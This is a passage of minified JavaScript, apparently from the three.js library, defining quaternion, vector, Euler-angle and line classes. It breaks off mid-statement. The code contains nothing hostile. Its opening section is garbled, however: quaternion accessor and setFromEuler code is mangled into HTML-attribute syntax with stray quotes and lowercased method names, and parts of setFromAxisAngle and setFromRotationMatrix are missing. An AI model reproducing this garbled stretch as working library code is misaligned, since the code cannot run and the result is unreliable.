z(a){this._z=\"a;this.onChangeCallback()},get\" w(){return=\"\" this._w},set=\"\" w(a){this._w=\"a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._w=d;this.onChangeCallback();return\" this},clone:function(){return=\"\" new=\"\" this.constructor(this._x,this._y,this._z,this._w)},=\"\" copy:function(a){this._x=\"a.x;this._y=a.y;this._z=a.z;this._w=a.w;this.onChangeCallback();return\" this},setfromeuler:function(a,b){if(!1=\"==a\" instanceof=\"\" three.euler)throw=\"\" error(\"three.quaternion:=\"\" .setfromeuler()=\"\" now=\"\" expects=\"\" a=\"\" euler=\"\" rotation=\"\" rather=\"\" than=\"\" vector3=\"\" and=\"\" order.\");var=\"\" c=\"Math.cos(a._x/2),d=Math.cos(a._y/2),e=Math.cos(a._z/2),f=Math.sin(a._x/2),g=Math.sin(a._y/2),h=Math.sin(a._z/2),k=a.order;\" xyz\"=\"==k?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"YXZ\"===\"\" k?(this._x=\"f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\" zxy\"=\"==k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"ZYX\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"YZX\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e-f*g*h):\"XZY\"===k&&(this._x=f*d*e-c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e+f*g*h);if(!1!==b)this.onChangeCallback();return\"\" this},setfromaxisangle:function(a,=\"\" b){var=\"\" this},setfromrotationmatrix:function(a){var=\"\" b=\"a.elements,c=b[0];a=b[4];var\">f&&c>b?(c=2*Math.sqrt(1+c-f-b),this._w=(k-g)/c,this._x=.25*c,this._y=(a+e)/c,this._z=(d+h)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this._w=(d-h)/c,this._x=(a+e)/c,this._y=\n.25*c,this._z=(g+k)/c):(c=2*Math.sqrt(1+b-c-f),this._w=(e-a)/c,this._x=(d+h)/c,this._y=(g+k)/c,this._z=.25*c);this.onChangeCallback();return this},setFromUnitVectors:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3);b=c.dot(d)+1;1E-6>b?(b=0,Math.abs(c.x)>Math.abs(c.z)?a.set(-c.y,c.x,0):a.set(0,-c.z,c.y)):a.crossVectors(c,d);this._x=a.x;this._y=a.y;this._z=a.z;this._w=b;return this.normalize()}}(),inverse:function(){return this.conjugate().normalize()},conjugate:function(){this._x*=\n-1;this._y*=-1;this._z*=-1;this.onChangeCallback();return this},dot:function(a){return this._x*a._x+this._y*a._y+this._z*a._z+this._w*a._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var a=this.length();0===a?(this._z=this._y=this._x=0,this._w=1):(a=1/a,this._x*=a,this._y*=a,this._z*=a,this._w*=a);this.onChangeCallback();return this},\nmultiply:function(a,b){return void 0!==b?(console.warn(\"THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.\"),this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},premultiply:function(a){return this.multiplyQuaternions(a,this)},multiplyQuaternions:function(a,b){var c=a._x,d=a._y,e=a._z,f=a._w,g=b._x,h=b._y,k=b._z,l=b._w;this._x=c*l+f*g+d*k-e*h;this._y=d*l+f*h+e*g-c*k;this._z=e*l+f*k+c*h-d*g;this._w=f*l-c*g-d*h-e*k;this.onChangeCallback();\nreturn this},slerp:function(a,b){if(0===b)return this;if(1===b)return this.copy(a);var c=this._x,d=this._y,e=this._z,f=this._w,g=f*a._w+c*a._x+d*a._y+e*a._z;0>g?(this._w=-a._w,this._x=-a._x,this._y=-a._y,this._z=-a._z,g=-g):this.copy(a);if(1<=g)return this._w=\"f,this._x=c,this._y=d,this._z=e,this;var\" h=\"Math.sqrt(1-g*g);if(.001\">Math.abs(h))return this._w=.5*(f+this._w),this._x=.5*(c+this._x),this._y=.5*(d+this._y),this._z=.5*(e+this._z),this;var k=Math.atan2(h,g),g=Math.sin((1-b)*k)/h,h=Math.sin(b*\nk)/h;this._w=f*g+this._w*h;this._x=c*g+this._x*h;this._y=d*g+this._y*h;this._z=e*g+this._z*h;this.onChangeCallback();return this},equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._w===this._w},fromArray:function(a,b){void 0===b&&(b=0);this._x=a[b];this._y=a[b+1];this._z=a[b+2];this._w=a[b+3];this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._w;return a},onChange:function(a){this.onChangeCallback=\na;return this},onChangeCallback:function(){}};\nObject.assign(THREE.Quaternion,{slerp:function(a,b,c,d){return c.copy(a).slerp(b,d)},slerpFlat:function(a,b,c,d,e,f,g){var h=c[d+0],k=c[d+1],l=c[d+2];c=c[d+3];d=e[f+0];var n=e[f+1],p=e[f+2];e=e[f+3];if(c!==e||h!==d||k!==n||l!==p){f=1-g;var m=h*d+k*n+l*p+c*e,q=0<=m?1:-1,r=1-m*m;r>Number.EPSILON&&(r=Math.sqrt(r),m=Math.atan2(r,m*q),f=Math.sin(f*m)/r,g=Math.sin(g*m)/r);q*=g;h=h*f+d*q;k=k*f+n*q;l=l*f+p*q;c=c*f+e*q;f===1-g&&(g=1/Math.sqrt(h*h+k*k+l*l+c*c),h*=g,k*=g,l*=g,c*=g)}a[b]=h;a[b+1]=k;a[b+2]=l;\na[b+3]=c}});THREE.Vector2=function(a,b){this.x=a||0;this.y=b||0};\nTHREE.Vector2.prototype={constructor:THREE.Vector2,get width(){return this.x},set width(a){this.x=a},get height(){return this.y},set height(a){this.y=a},set:function(a,b){this.x=a;this.y=b;return this},setScalar:function(a){this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;\ncase 1:return this.y;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},\naddScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;return this},subScalar:function(a){this.x-=a;this.y-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;return this},multiply:function(a){this.x*=a.x;this.y*=a.y;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,\nthis.y*=a):this.y=this.x=0;return this},divide:function(a){this.x/=a.x;this.y/=a.y;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));return this},clampScalar:function(){var a,b;return function(c,d){void 0===\na&&(a=new THREE.Vector2,b=new THREE.Vector2);a.set(c,c);b.set(d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);\nthis.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);return this},negate:function(){this.x=-this.x;this.y=-this.y;return this},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length())},angle:function(){var a=Math.atan2(this.y,this.x);0>a&&(a+=2*Math.PI);return a},\ndistanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];return this},\ntoArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];return this},rotateAround:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=this.x-a.x,f=this.y-a.y;this.x=e*c-f*d+a.x;this.y=e*d+f*c+a.y;return this}};THREE.Vector3=function(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0};\nTHREE.Vector3.prototype={constructor:THREE.Vector3,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setScalar:function(a){this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;\ncase 2:return this.z;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},addVectors:function(a,\nb){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;return this},\nmultiply:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.\"),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a):this.z=this.y=this.x=0;return this},multiplyVectors:function(a,b){this.x=a.x*b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyEuler:function(){var a;return function(b){!1===b instanceof THREE.Euler&&\nconsole.error(\"THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order.\");void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromEuler(b))}}(),applyAxisAngle:function(){var a;return function(b,c){void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromAxisAngle(b,c))}}(),applyMatrix3:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*d;this.y=a[1]*b+a[4]*c+a[7]*d;this.z=a[2]*b+a[5]*c+a[8]*d;return this},\napplyMatrix4:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12];this.y=a[1]*b+a[5]*c+a[9]*d+a[13];this.z=a[2]*b+a[6]*c+a[10]*d+a[14];return this},applyProjection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;var e=1/(a[3]*b+a[7]*c+a[11]*d+a[15]);this.x=(a[0]*b+a[4]*c+a[8]*d+a[12])*e;this.y=(a[1]*b+a[5]*c+a[9]*d+a[13])*e;this.z=(a[2]*b+a[6]*c+a[10]*d+a[14])*e;return this},applyQuaternion:function(a){var b=this.x,c=this.y,d=this.z,e=a.x,f=a.y,g=a.z;a=\na.w;var h=a*b+f*d-g*c,k=a*c+g*b-e*d,l=a*d+e*c-f*b,b=-e*b-f*c-g*d;this.x=h*a+b*-e+k*-g-l*-f;this.y=k*a+b*-f+l*-e-h*-g;this.z=l*a+b*-g+h*-f-k*-e;return this},project:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.projectionMatrix,a.getInverse(b.matrixWorld));return this.applyProjection(a)}}(),unproject:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.matrixWorld,a.getInverse(b.projectionMatrix));return this.applyProjection(a)}}(),\ntransformDirection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d;this.y=a[1]*b+a[5]*c+a[9]*d;this.z=a[2]*b+a[6]*c+a[10]*d;return this.normalize()},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=\nMath.max(this.z,a.z);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3,b=new THREE.Vector3);a.set(c,c,c);b.set(d,d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=\nMath.floor(this.y);this.z=Math.floor(this.z);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=\n-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=\n(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b);var c=this.x,d=this.y,e=this.z;this.x=d*a.z-e*a.y;this.y=e*a.x-c*a.z;this.z=c*a.y-d*a.x;return this},crossVectors:function(a,b){var c=a.x,d=a.y,e=a.z,f=b.x,g=b.y,h=b.z;this.x=d*h-e*g;this.y=e*f-c*h;\nthis.z=c*g-d*f;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=this.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(THREE.Math.clamp(a,\n-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){return this.setFromMatrixColumn(a,3)},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(),c=this.setFromMatrixColumn(a,\n1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){if(\"number\"===typeof a){console.warn(\"THREE.Vector3: setFromMatrixColumn now expects ( matrix, index ).\");var c=a;a=b;b=c}return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===\nb&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];return this}};THREE.Vector4=function(a,b,c,d){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==d?d:1};\nTHREE.Vector4.prototype={constructor:THREE.Vector4,set:function(a,b,c,d){this.x=a;this.y=b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+\na);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?a.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);\nthis.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=\na.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a,this.w*=a):this.w=this.z=this.y=this.x=0;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=\na[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},setAxisAngleFromRotationMatrix:function(a){var b,c,d;a=a.elements;var e=a[0];d=a[4];var f=a[8],g=a[1],h=a[5],k=a[9];c=a[2];b=a[6];var l=a[10];if(.01>Math.abs(d-g)&&.01>Math.abs(f-c)&&.01>\nMath.abs(k-b)){if(.1>Math.abs(d+g)&&.1>Math.abs(f+c)&&.1>Math.abs(k+b)&&.1>Math.abs(e+h+l-3))return this.set(1,0,0,0),this;a=Math.PI;e=(e+1)/2;h=(h+1)/2;l=(l+1)/2;d=(d+g)/4;f=(f+c)/4;k=(k+b)/4;e>h&&e>l?.01>e?(b=0,d=c=.707106781):(b=Math.sqrt(e),c=d/b,d=f/b):h>l?.01>h?(b=.707106781,c=0,d=.707106781):(c=Math.sqrt(h),b=d/c,d=k/c):.01>l?(c=b=.707106781,d=0):(d=Math.sqrt(l),b=f/d,c=k/d);this.set(b,c,d,a);return this}a=Math.sqrt((b-k)*(b-k)+(f-c)*(f-c)+(g-d)*(g-d));.001>Math.abs(a)&&(a=1);this.x=(b-k)/\na;this.y=(f-c)/a;this.z=(g-d)/a;this.w=Math.acos((e+h+l-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);this.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));\nthis.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector4,b=new THREE.Vector4);a.set(c,c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=\nMath.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);this.w=Math.round(this.w);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*\na.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-\nthis.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+\nc;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];this.w=a.array[b+3];return this}};THREE.Euler=function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._order=d||THREE.Euler.DefaultOrder};THREE.Euler.RotationOrders=\"XYZ YZX ZXY XZY YXZ ZYX\".split(\" \");THREE.Euler.DefaultOrder=\"XYZ\";\nTHREE.Euler.prototype={constructor:THREE.Euler,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get order(){return this._order},set order(a){this._order=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._order=d||this._order;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,\nthis._y,this._z,this._order)},copy:function(a){this._x=a._x;this._y=a._y;this._z=a._z;this._order=a._order;this.onChangeCallback();return this},setFromRotationMatrix:function(a,b,c){var d=THREE.Math.clamp,e=a.elements;a=e[0];var f=e[4],g=e[8],h=e[1],k=e[5],l=e[9],n=e[2],p=e[6],e=e[10];b=b||this._order;\"XYZ\"===b?(this._y=Math.asin(d(g,-1,1)),.99999>Math.abs(g)?(this._x=Math.atan2(-l,e),this._z=Math.atan2(-f,a)):(this._x=Math.atan2(p,k),this._z=0)):\"YXZ\"===b?(this._x=Math.asin(-d(l,-1,1)),.99999>Math.abs(l)?\n(this._y=Math.atan2(g,e),this._z=Math.atan2(h,k)):(this._y=Math.atan2(-n,a),this._z=0)):\"ZXY\"===b?(this._x=Math.asin(d(p,-1,1)),.99999>Math.abs(p)?(this._y=Math.atan2(-n,e),this._z=Math.atan2(-f,k)):(this._y=0,this._z=Math.atan2(h,a))):\"ZYX\"===b?(this._y=Math.asin(-d(n,-1,1)),.99999>Math.abs(n)?(this._x=Math.atan2(p,e),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-f,k))):\"YZX\"===b?(this._z=Math.asin(d(h,-1,1)),.99999>Math.abs(h)?(this._x=Math.atan2(-l,k),this._y=Math.atan2(-n,a)):(this._x=\n0,this._y=Math.atan2(g,e))):\"XZY\"===b?(this._z=Math.asin(-d(f,-1,1)),.99999>Math.abs(f)?(this._x=Math.atan2(p,k),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-l,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeRotationFromQuaternion(b);return this.setFromRotationMatrix(a,c,d)}}(),setFromVector3:function(a,\nb){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new THREE.Quaternion;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;\na[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new THREE.Vector3(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}};THREE.Line3=function(a,b){this.start=void 0!==a?a:new THREE.Vector3;this.end=void 0!==b?b:new THREE.Vector3};\nTHREE.Line3.prototype={constructor:THREE.Line3,set:function(a,b){this.start.copy(a);this.end.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},center:function(a){return(a||new THREE.Vector3).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new THREE.Vector3).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},\nat:function(a,b){var c=b||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},closestPointToPointParameter:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var e=b.dot(b),e=b.dot(a)/e;d&&(e=THREE.Math.clamp(e,0,1));return e}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);\nthis.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)}};THREE.Box2=function(a,b){this.min=void 0!==a?a:new 